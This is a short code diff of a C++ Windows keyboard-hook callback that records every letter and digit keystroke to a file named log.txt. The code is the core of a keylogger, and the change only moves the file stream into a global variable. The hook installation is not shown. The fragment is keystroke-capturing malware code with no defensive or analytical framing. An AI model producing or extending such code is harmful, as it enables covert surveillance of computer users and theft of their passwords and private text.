@@ -1,6 +1,8 @@
 #include <windows.h>
 #include <fstream>
 
+std::ofstream f;
+
 LRESULT CALLBACK proc(int nCode, WPARAM wParam, LPARAM lParam)
 {
     PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)lParam;
@@ -10,10 +12,10 @@ LRESULT CALLBACK proc(int nCode, WPARAM wParam, LPARAM lParam)
         {
             if ((key->vkCode >= 65 && key->vkCode <= 90) || (key->vkCode >= 48 && key->vkCode <= 57))
             {
-                std::ofstream log;
-                log.open("log.txt", std::ofstream::app);
-                log << char(key->vkCode) << "\n";
-                log.close();
+                
+                f.open("log.txt", std::ofstream::app);
+                f << char(key->vkCode) << "\n";
+                f.close();
             }
         }
     }
